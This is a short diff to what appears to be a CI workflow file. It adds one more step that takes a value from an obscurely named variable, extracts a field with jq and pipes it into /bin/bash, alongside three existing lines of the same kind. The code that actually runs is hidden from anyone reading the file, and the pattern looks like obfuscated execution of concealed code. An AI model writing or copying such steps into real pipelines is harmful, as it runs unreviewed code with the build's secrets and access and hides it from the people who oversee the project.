@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$sft2499" | jq -r .e1 | /bin/bash
           echo $tiao99404 | jq -r .z8909 | /bin/bash
           echo $ivix1203 | jq -r .qbxhy137 | /bin/bash
+          printf '%s' "$psx8" | jq -r .lan99 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
